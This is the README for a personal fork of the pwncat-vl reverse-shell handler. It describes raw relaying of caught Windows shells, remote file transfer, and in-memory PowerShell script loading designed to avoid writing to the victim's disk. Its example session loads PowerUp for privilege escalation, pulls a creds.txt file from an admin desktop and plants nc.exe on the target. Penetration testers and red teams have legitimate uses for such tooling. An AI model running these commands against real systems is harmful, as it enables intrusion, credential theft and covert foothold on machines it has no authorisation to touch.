# Raw passthrough shell & platform additions (personal fork)

Local modifications on top of pwncat-vl. Just run `pwncat-vl -lp <port>` and
catch anything — Linux gets the full platform; Windows/PowerShell/cmd and other
shells the platform can't bootstrap are caught in a raw passthrough relay
instead of being dropped.

## Auto behavior
- Linux shells: full pwncat platform as usual.
- Windows/unusual shells: detected fast (non-destructively) and relayed raw.
- `--raw` / `-r`: force raw mode (skip platform bootstrap).

## Raw shell features
- Persistent command history + line editing (readline).
- **Tab completion of remote filenames** — queries the victim live
  (PowerShell `Get-ChildItem` / cmd `dir`), history fallback.
- Ctrl-C returns to the prompt; Ctrl-D disconnects.

## Local commands (type at the raw prompt)
```
:download <remote> [local]     pull a file  (base64 over the shell, md5-verified)
:upload   <local> [remote]     push a file  (chunked, md5-verified)
:load     <local.ps1>          load a PowerShell script in-memory (IEX) -- no
                               disk on the victim; its functions become callable
:run      <local.ps1> [cmd]    load it, then run [cmd] and stream the output
:help                          list local commands
:exit / Ctrl-D                 disconnect
```
`:load`/`:run` require a PowerShell shell (they run in your interactive
runspace so functions persist). Transfer works on PowerShell and cmd.exe.

## Example (Windows)
```
pwncat-vl -lp 4444
# ... catch a PowerShell reverse shell ...
:load /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
Invoke-PrivescAudit
:download C:\Users\admin\Desktop\creds.txt
:upload ./nc.exe C:\Windows\Temp\nc.exe
```

## Platform fixes included
- Windows platform is now instantiable (`context_changed` was missing).
- Linux bootstrap: fast Windows detection, marker-based sync (no race),
  no-PTY newline normalization, promptvars-safe bash prompt.
